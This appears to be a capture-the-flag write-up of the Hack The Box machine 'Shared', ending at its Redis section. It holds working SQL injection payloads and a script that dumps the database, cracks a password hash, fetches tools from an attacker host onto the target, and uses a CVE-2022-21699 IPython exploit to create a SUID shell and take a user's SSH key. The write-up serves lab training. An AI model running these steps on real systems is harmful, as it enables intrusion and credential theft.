+          <p>Shared is a medium Linux machine created by Nauten on Hack The Box that features a website with a virtual hostname that is vulnerable to SQL injection. Successful exploitation of this vulnerability provides us with the password for a user called james_mason. With these credentials we are able to login via SSH and elevate privileges to a user called dan_smith by exploiting a cron job that uses a version of ipython that is vulnerable to CVE-2022-21699. We then reverse-engineer an executable using both static and dynamic analysis to recover the password for the local Redis service. The Redis process is running as root, so we load a special shared object module using LOAD MODULE to execute commands as root.</p>
+
+
+<h2 class="relative group"><span style="color: #33acff">Initial Recon</span> 
+    <div id="span-stylecolor-33acffinitial-reconspan" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#span-stylecolor-33acffinitial-reconspan" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>Let’s first set up our environment and run a TCP port scan with this custom nmap wrapper.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Mhil4ne@Kali</span>
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">rhost</span><span class="o">=</span><span class="s2">&#34;10.10.10.x&#34;</span>
+</span></span><span class="line"><span class="cl">sudo nmap -sS -p- --open --min-rate <span class="m">3000</span> -n -Pn -vvv  <span class="nv">$rhost</span> -oG nmap
+</span></span></code></pre></div><p>The scan reports that the SSH service, HTTP service, and HTTPS service are running on ports 22, 80, and 443 respectively</p>
+
+
+<h2 class="relative group"><span style="color: #33acff">Web Recon</span> 
+    <div id="span-stylecolor-33acffweb-reconspan" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#span-stylecolor-33acffweb-reconspan" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>Upon visiting port 80, we are redirected to shared.htb. Let’s add this hostname to our /etc/hosts{:.filepath} file with the corresponding IP address.</p>
+<p>Now we’ll visit <a href="https://shared.htb/"   target="_blank">
+    https://shared.htb/</a> in a browser session being proxied through the BurpSuite HTTP proxy.</p>
+<p>Index page
+shared.htb web index page</p>
+
+
+<h3 class="relative group">Walking the Application 
+    <div id="walking-the-application" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#walking-the-application" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>When exploring the content of the website, we eventually discover the checkout page at /index.php?controller=cart&amp;action=show. When we hover over the checkout button, we can see that it will send us to <a href="https://checkout.shared.htb"   target="_blank">
+    https://checkout.shared.htb</a>. Let’s add this virtual hostname to our /etc/hosts{:.filepath} file so we can view its content.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo sed -E -i <span class="s1">&#39;s/(shared.htb).*/\1 checkout.\1/&#39;</span> /etc/hosts
+</span></span></code></pre></div><p>Now when we add an item to our cart and navigate to /index.php?controller=cart&amp;action=show, we’ll click the checkout button to be redirected to the checkout site.</p>
+
+
+<h3 class="relative group">Investigating Functionality 
+    <div id="investigating-functionality" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#investigating-functionality" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>It’s interesting how this site is able to determine which item we had in our cart considering we did not supply any HTTP GET or POST parameters. Let’s investigate.</p>
+<p>Looking at the initial request we sent to the checkout site in the BurpSuite site map, we can see that our request contains an unusual cookie called custom_cart. The value of this cookie can be automatically decoded by highlighting it, revealing a JSON object with the product code and quantity of the checkout item.</p>
+<p>We find a mysterious cookie in BurpSuite</p>
+<p>We can infer that the site uses the supplied product code in custom_cart to find the price of the item since we do not supply the price, but only the product code. This activity is likely handled by some type of database solution such as an SQL server. With this in mind, we can check if this functionality is vulnerable to SQL injection.</p>
+
+
+<h3 class="relative group">Vulnerability Discovery 
+    <div id="vulnerability-discovery" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#vulnerability-discovery" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Let’s input some basic SQL injection payloads to the cookie in the BurpSuite repeater tab to see if SQL injection is possible.</p>
+<p>The server’s response to a common SQL injection payload</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;CRAAFTKP&#39;#&#34;</span>:<span class="s2">&#34;1&#34;</span><span class="o">}</span>
+</span></span></code></pre></div><p>The response to the first payload suggests that SQL injection is possible but we can make sure by sending a payload that should evaluate to false, and one that should be true.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/usr/bin/env python3
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl">from urllib.parse import quote
+</span></span><span class="line"><span class="cl">from sys import argv
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> len<span class="o">(</span>argv<span class="o">)</span> <span class="o">==</span> 2:
+</span></span><span class="line"><span class="cl">        <span class="nv">sqli</span> <span class="o">=</span> argv<span class="o">[</span>1<span class="o">]</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">sqli</span> <span class="o">=</span> sqli.replace<span class="o">(</span><span class="s1">&#39;\\&#39;</span>, <span class="s1">&#39;\\\\&#39;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">sqli</span> <span class="o">=</span> sqli.replace<span class="o">(</span><span class="s1">&#39;&#34;&#39;</span>,<span class="s1">&#39;\\&#34;&#39;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">        print<span class="o">(</span>quote<span class="o">(</span><span class="s1">&#39;{&#34;&#39;</span> + argv<span class="o">[</span>1<span class="o">]</span> + <span class="s1">&#39;&#34;:&#34;1&#34;}&#39;</span><span class="o">))</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">chmod +x makepayload.py
+</span></span><span class="line"><span class="cl"><span class="nv">true</span><span class="o">=</span><span class="k">$(</span>./makepayload.py <span class="s2">&#34;&#39; OR 1=1#&#34;</span><span class="k">)</span> <span class="c1"># Always resolves to true</span>
+</span></span><span class="line"><span class="cl"><span class="nv">false</span><span class="o">=</span><span class="k">$(</span>./makepayload.py <span class="s2">&#34;&#39; AND 1=2#&#34;</span><span class="k">)</span> <span class="c1"># Always resolves to false</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">url</span><span class="o">=</span><span class="s2">&#34;https://checkout.shared.htb&#34;</span>
+</span></span><span class="line"><span class="cl">curl -k -s <span class="nv">$url</span> -b <span class="s2">&#34;custom_cart=</span><span class="nv">$true</span><span class="s2">&#34;</span> <span class="p">|</span> sed <span class="s1">&#39;s/^ *//&#39;</span> &gt; true.html
+</span></span><span class="line"><span class="cl">curl -k -s <span class="nv">$url</span> -b <span class="s2">&#34;custom_cart=</span><span class="nv">$false</span><span class="s2">&#34;</span> <span class="p">|</span> sed <span class="s1">&#39;s/^ *//&#39;</span> &gt; false.html
+</span></span></code></pre></div><p>This should leave you with two files called false.html{:.filepath} and true.html{:.filepath}. To find the difference between the two response bodies we can use diff.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">diff false.html true.html
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">37,39c37,39
+</span></span><span class="line"><span class="cl">&lt; &lt;td&gt;Not Found&lt;/td&gt;
+</span></span><span class="line"><span class="cl">&lt; &lt;td&gt;0&lt;/td&gt;
+</span></span><span class="line"><span class="cl">&lt; &lt;td&gt;<span class="nv">$0</span>,00&lt;/td&gt;
+</span></span><span class="line"><span class="cl">---
+</span></span><span class="line"><span class="cl">&gt; &lt;td&gt;53GG2EF8&lt;/td&gt;
+</span></span><span class="line"><span class="cl">&gt; &lt;td&gt;1&lt;/td&gt;
+</span></span><span class="line"><span class="cl">&gt; &lt;td&gt;<span class="nv">$23</span>,90&lt;/td&gt;
+</span></span><span class="line"><span class="cl">45c45
+</span></span><span class="line"><span class="cl">&lt; &lt;th <span class="nv">scope</span><span class="o">=</span><span class="s2">&#34;col&#34;</span>&gt;<span class="nv">$0</span>,00&lt;/th&gt;
+</span></span><span class="line"><span class="cl">---
+</span></span><span class="line"><span class="cl">&gt; &lt;th <span class="nv">scope</span><span class="o">=</span><span class="s2">&#34;col&#34;</span>&gt;<span class="nv">$23</span>,90&lt;/th&gt;
+</span></span></code></pre></div><p>The false query returns “Not Found” and zero values for the quantity and price while the true query returns a product entry. This is definitely enough evidence of an SQL injection vulnerability to begin exploitation.</p>
+
+
+<h2 class="relative group"><span style="color: #33acff">Web Exploitation</span> 
+    <div id="span-stylecolor-33acffweb-exploitationspan" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#span-stylecolor-33acffweb-exploitationspan" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>We have already determined that boolean-based blind SQL injection is possible with the true and false queries, but there is a good chance we can use UNION SELECT queries to exfiltrate database values without having to use a side-channel.</p>
+
+
+<h3 class="relative group">Union Query Exfiltration 
+    <div id="union-query-exfiltration" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#union-query-exfiltration" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Let’s first find the number of columns in the original query so we can match it in our UNION SELECT extension.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">payload</span><span class="o">=</span><span class="k">$(</span>./makepayload.py <span class="s2">&#34;&#39; UNION SELECT &#39;c0lumn1&#39;,&#39;c0lumn2&#39;,&#39;c0lumn3&#39;#&#34;</span><span class="k">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">curl -k -s <span class="s2">&#34;https://checkout.shared.htb&#34;</span> -b <span class="s2">&#34;custom_cart=</span><span class="nv">$payload</span><span class="s2">&#34;</span> <span class="p">|</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>	sed <span class="s1">&#39;s/^ *//&#39;</span> <span class="p">|</span>
+</span></span><span class="line"><span class="cl">	egrep <span class="s1">&#39;&lt;/?td&gt;&#39;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&lt;td&gt;c0lumn2&lt;/td&gt;
+</span></span><span class="line"><span class="cl">&lt;td&gt;1&lt;/td&gt;
+</span></span><span class="line"><span class="cl">&lt;td&gt;$&lt;/td&gt;
+</span></span></code></pre></div><p>Notice how the response contains the value we sent in the second column. This means we can extract data through the second column. Now let’s create a script to get any raw value from the database.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span> -z <span class="s2">&#34;</span><span class="nv">$SELECT</span><span class="s2">&#34;</span> <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">&#34;SELECT=* FROM=* WHERE=* </span><span class="nv">$0</span><span class="s2">&#34;</span> <span class="o">&amp;&amp;</span> <span class="nb">exit</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">payload</span><span class="o">=</span><span class="s2">&#34;&#39; UNION SELECT &#39;&#39;,</span><span class="nv">$SELECT</span><span class="s2">,&#39;&#39;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span> -z <span class="s2">&#34;</span><span class="nv">$FROM</span><span class="s2">&#34;</span> <span class="o">]</span> <span class="o">||</span> <span class="nv">payload</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$payload</span><span class="s2"> FROM </span><span class="nv">$FROM</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span> -z <span class="s2">&#34;</span><span class="nv">$WHERE</span><span class="s2">&#34;</span> <span class="o">]</span> <span class="o">||</span> <span class="nv">payload</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$payload</span><span class="s2"> WHERE </span><span class="nv">$WHERE</span><span class="s2">&#34;</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="nv">$payload</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">payload</span><span class="o">=</span><span class="k">$(</span>./makepayload.py <span class="s2">&#34;</span><span class="nv">$payload</span><span class="s2">#&#34;</span><span class="k">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">curl -k -s <span class="s2">&#34;https://checkout.shared.htb&#34;</span> -b <span class="s2">&#34;custom_cart=</span><span class="nv">$payload</span><span class="s2">&#34;</span> <span class="p">|</span>
+</span></span><span class="line"><span class="cl">	egrep <span class="s1">&#39;&lt;/?td&gt;&#39;</span> <span class="p">|</span>
+</span></span><span class="line"><span class="cl">	head -1 <span class="p">|</span>
+</span></span><span class="line"><span class="cl">	sed -E <span class="s1">&#39;s/^ *&lt;td&gt;(.*)&lt;\/td&gt;$/\1/&#39;</span>
+</span></span></code></pre></div><p>Then we can see if we can get the available database names. Remember that this database is probably MySQL because the # comment is working.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">chmod +x sqli.sh
+</span></span><span class="line"><span class="cl"><span class="nv">SELECT</span><span class="o">=</span><span class="s2">&#34;group_concat(schema_name)&#34;</span>   <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span><span class="nv">FROM</span><span class="o">=</span><span class="s2">&#34;information_schema.schemata&#34;</span>   <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>	./sqli.sh
+</span></span></code></pre></div><pre tabindex="0"><code>information_schema,checkout
+</code></pre><p>There is a database called checkout that we should explore. Let’s find the names of its tables.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="o">=</span><span class="s2">&#34;group_concat(table_name)&#34;</span><span class="w">   </span><span class="err">\</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">FROM</span><span class="o">=</span><span class="s2">&#34;information_schema.tables&#34;</span><span class="w">    </span><span class="err">\</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">WHERE</span><span class="o">=</span><span class="s2">&#34;table_schema=&#39;checkout&#39;&#34;</span><span class="w">     </span><span class="err">\</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="p">.</span><span class="o">/</span><span class="n">sqli</span><span class="p">.</span><span class="n">sh</span><span class="w">
+</span></span></span></code></pre></div><pre tabindex="0"><code>user,product
+</code></pre><p>The user table seems interesting. Let’s find the column names and dump the table contents.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="o">=</span><span class="s2">&#34;group_concat(column_name)&#34;</span><span class="w">   </span><span class="err">\</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">FROM</span><span class="o">=</span><span class="s2">&#34;information_schema.columns&#34;</span><span class="w">    </span><span class="err">\</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">WHERE</span><span class="o">=</span><span class="s2">&#34;table_name=&#39;user&#39;&#34;</span><span class="w">            </span><span class="err">\</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="p">.</span><span class="o">/</span><span class="n">sqli</span><span class="p">.</span><span class="n">sh</span><span class="w">
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">id</span><span class="p">,</span><span class="n">username</span><span class="p">,</span><span class="n">password</span><span class="w">
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="o">=</span><span class="s2">&#34;group_concat(concat(id,0x7c,username,0x7c,password))&#34;</span><span class="w"> </span><span class="err">\</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">FROM</span><span class="o">=</span><span class="s2">&#34;checkout.user&#34;</span><span class="w"> </span><span class="err">\</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="p">.</span><span class="o">/</span><span class="n">sqli</span><span class="p">.</span><span class="n">sh</span><span class="w">
+</span></span></span></code></pre></div><pre tabindex="0"><code>1|james_mason|[REDACTED]
+</code></pre><p>There is only one result, but we got what looks like an MD5 hash in the password column for the user james_mason.</p>
+
+
+<h3 class="relative group">Shell as james_mason 
+    <div id="shell-as-james_mason" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#shell-as-james_mason" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Let’s try to crack the hash using John the Ripper</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># mhil4ne@kali</span>
+</span></span><span class="line"><span class="cl"><span class="nv">hash</span><span class="o">=</span><span class="s2">&#34;&#34;</span> <span class="c1"># Hash here</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;james_mason:</span><span class="nv">$hash</span><span class="s2">&#34;</span> &gt; md5.john
+</span></span><span class="line"><span class="cl">john md5.john <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>	--format<span class="o">=</span><span class="s2">&#34;raw-md5&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>	--wordlist<span class="o">=</span><span class="s2">&#34;rockyou.txt&#34;</span> <span class="c1"># classic rockyou.txt wordlist</span>
+</span></span></code></pre></div><p>Using these credentials on the target’s SSH server will land us a shell as james_mason.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># mhil4ne@kali</span>
+</span></span><span class="line"><span class="cl">ssh <span class="s2">&#34;james_mason@</span><span class="nv">$rhost</span><span class="s2">&#34;</span>
+</span></span></code></pre></div><p>There is no user flag in our home directory so we might need to do some lateral movement.</p>
+
+
+<h3 class="relative group">Lateral Movement 
+    <div id="lateral-movement" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#lateral-movement" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>We will be using LinPEAS from PEASS-ng to look for any useful information on the machine. We will also be using pspy to snoop on processes.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># mhil4ne@kali</span>
+</span></span><span class="line"><span class="cl"><span class="nv">lhost</span><span class="o">=</span><span class="s2">&#34;10.10.14.10&#34;</span> <span class="c1"># Listener host</span>
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> <span class="k">$(</span>mktemp -d<span class="k">)</span>
+</span></span><span class="line"><span class="cl">wget <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>	<span class="s2">&#34;https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>	<span class="s2">&#34;https://github.com/carlospolop/PEASS-ng/releases/download/20220522/linpeas.sh&#34;</span>
+</span></span><span class="line"><span class="cl">php -S <span class="nv">$lhost</span>:80
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># james_mason@shared.htb (SSH)</span>
+</span></span><span class="line"><span class="cl"><span class="nv">lhost</span><span class="o">=</span><span class="s2">&#34;10.10.14.10&#34;</span> <span class="c1"># Attacker&#39;s IP address</span>
+</span></span><span class="line"><span class="cl">mkdir .sneak <span class="o">&amp;&amp;</span> <span class="nb">cd</span> .sneak
+</span></span><span class="line"><span class="cl">wget <span class="s2">&#34;http://</span><span class="nv">$lhost</span><span class="s2">/pspy64&#34;</span> <span class="s2">&#34;http://</span><span class="nv">$lhost</span><span class="s2">/linpeas.sh&#34;</span>
+</span></span><span class="line"><span class="cl">bash ./linpeas.sh <span class="p">|</span> tee linpeas.log
+</span></span></code></pre></div><p>We don’t get anything that blatantly stands out in the LinPEAS output. Let’s try running PSpy for a few minutes.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># james_mason@shared.htb (SSH)</span>
+</span></span><span class="line"><span class="cl">chmod +x pspy64
+</span></span><span class="line"><span class="cl">timeout 3m ./pspy64 <span class="p">|</span> tee pspy.log
+</span></span></code></pre></div><p>Looking at the output, user ID 0 and user ID 1001 seem to be running routine commands. UID 0 is root and User ID 1001 turns out to be user dan_smith, declared in /etc/passwd{:.filepath}. It can be noted that dan_smith runs an interesting command every minute.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/bin/sh -c /usr/bin/pkill ipython<span class="p">;</span> <span class="nb">cd</span> /opt/scripts_review/ <span class="o">&amp;&amp;</span> /usr/local/bin/ipython
+</span></span></code></pre></div><p>The user enters the /opt/scripts_review{:.filepath} directory and executes /usr/local/bin/ipython{:.filepath}.</p>
+
+
+<h3 class="relative group">CVE-2022-21699 
+    <div id="cve-2022-21699" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#cve-2022-21699" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>After doing some research into ipython, we come across a vulnerability advisory that details a code execution flaw.</p>
+<blockquote>
+<p>We’d like to disclose an arbitrary code execution vulnerability in IPython that stems from IPython executing untrusted files in CWD. This vulnerability allows one user to run code as another.</p>
+</blockquote>
+<p>Let’s check if the version on the machine is vulnerable.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># james_mason@shared.htb (SSH)</span>
+</span></span><span class="line"><span class="cl">/usr/local/bin/ipython --version
+</span></span></code></pre></div><p>The version is 8.0.0, which is vulnerable. Since the routine command executed by dan_smith is run in the /opt/scripts_review{:.filepath} directory, we could exploit the vulnerability if /opt/scripts_review{:.filepath} is writable.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># james_mason@shared.htb (SSH)</span>
+</span></span><span class="line"><span class="cl">ls -la /opt/scripts_review
+</span></span></code></pre></div><p>It is writable by those in the developer group. According to the output of the id command, our current user is actually part of this group.</p>
+
+
+<h3 class="relative group">Exploitation 
+    <div id="exploitation" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#exploitation" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Let’s test our hypothesis by following the instructions in the advisory to execute code as dan_smith.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="nv">exploitdir</span><span class="o">=</span><span class="s2">&#34;/opt/scripts_review&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">cmd</span><span class="o">=</span><span class="s2">&#34;cp /bin/sh /tmp/dan_smith_sh;chmod a+xs /tmp/dan_smith_sh&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">mkdir -m <span class="m">777</span> <span class="s2">&#34;</span><span class="nv">$exploitdir</span><span class="s2">/profile_default&#34;</span>
+</span></span><span class="line"><span class="cl">mkdir -m <span class="m">777</span> <span class="s2">&#34;</span><span class="nv">$exploitdir</span><span class="s2">/profile_default/startup&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;__import__(&#39;os&#39;).popen(&#39;</span><span class="nv">$cmd</span><span class="s2">&#39;)&#34;</span> &gt; <span class="s2">&#34;</span><span class="nv">$exploitdir</span><span class="s2">/profile_default/startup/x.py&#34;</span>
+</span></span></code></pre></div><p>After running the script and waiting a minute, our SUID shell should be at /tmp/dan_smith_sh{:.filepath}.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># james_mason@shared.htb (SSH)</span>
+</span></span><span class="line"><span class="cl">/tmp/dan_smith_sh -p
+</span></span></code></pre></div>
+
+<h2 class="relative group"><span style="color: #33acff">Privilege Escalation </span> 
+    <div id="span-stylecolor-33acffprivilege-escalation-span" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#span-stylecolor-33acffprivilege-escalation-span" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>The first flag is located at /home/dan_smith/user.txt{:.filepath}</p>
+
+
+<h3 class="relative group">Stabilizing Shell 
+    <div id="stabilizing-shell" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#stabilizing-shell" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Let’s copy the contents of /home/dan_smith/.ssh/id_rsa{:.filepath} over to the attacker machine and use it to log in as dan_smith via SSH to get a more stable shell.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># mhil4ne@kali</span>
+</span></span><span class="line"><span class="cl">chmod <span class="m">600</span> dan_smith_id_rsa
+</span></span><span class="line"><span class="cl">ssh -i dan_smith_id_rsa <span class="s2">&#34;dan_smith@</span><span class="nv">$rhost</span><span class="s2">&#34;</span>
+</span></span></code></pre></div><p>When running the id command, we learn that our current user is part of the sysadmin group. Let’s see what this group has special access to.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># dan_smith@shared.htb (SSH)</span>
+</span></span><span class="line"><span class="cl">find / -group sysadmin 2&gt;/dev/null
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/usr/local/bin/redis_connector_dev
+</span></span></code></pre></div><p>One file at /usr/local/bin/redis_connector_dev{:.filepath} is returned. This file probably has something to do with a key-value data storage solution known as Redis. When we execute /usr/local/bin/redis_connector_dev{:.filepath}, it prints a log message saying “Logging to redis instance using password” and what looks like the output of the INFO Server redis query.</p>
+
+
+<h3 class="relative group">Redis 
+    <div id="redis" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#redis" aria-label="Anchor">#</a>
+    </span>        
+    
